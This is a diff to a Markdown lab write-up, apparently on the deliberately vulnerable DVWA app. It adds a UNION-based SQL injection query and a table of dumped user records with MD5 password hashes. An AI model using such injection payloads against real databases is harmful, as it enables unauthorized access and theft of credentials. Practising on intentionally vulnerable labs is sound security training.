@@ -64,6 +64,11 @@ The query I used: <br>
 
 </div>
 
+The query I used: <br>
+``` 
+  ' UNION SELECT user_id, first_name FROM users UNION SELECT last_name, user FROM users UNION SELECT password, avatar FROM users UNION SELECT last_login, user_id FROM users UNION SELECT failed_login, user_id FROM users #
+```
+
 - users
    - user_id 
    - first_name
@@ -77,8 +82,12 @@ The query I used: <br>
 <div align="center">
   
 ## users
-| user_id | first_name | last_name |
-| :-----------: | :----------: | :----------: |
-| 1 | This is a test comment. | test |
+| user_id | first_name | last_name | user | password | avatar | last_login | failed_login |
+| :-----------: | :----------: | :----------: | :----------: | :----------: | :----------: | :----------: | :----------: |
+| 1 | admin | admin | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | /hackable/users/admin.jpg | 2025-10-21 14:45:24 | 0 |
+| 2 | Gordon | Brown | godonb | e99a18c428cb38d5f260853678922e03 | /hackable/users/gordonb.jpg | 2025-10-21 14:45:24 | 0 |
+| 3 | Hack | Me | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | /hackable/users/1337.jpg | 2025-10-21 14:45:24 | 0 |
+| 4 | Pablo | Picasso | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | /hackable/users/pablo.jpg | 2025-10-21 14:45:24 | 0 |
+| 5 | Bob | Smith | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | /hackable/users/smithy.jpg | 2025-10-21 14:45:24 | 0 |
 
 </div>
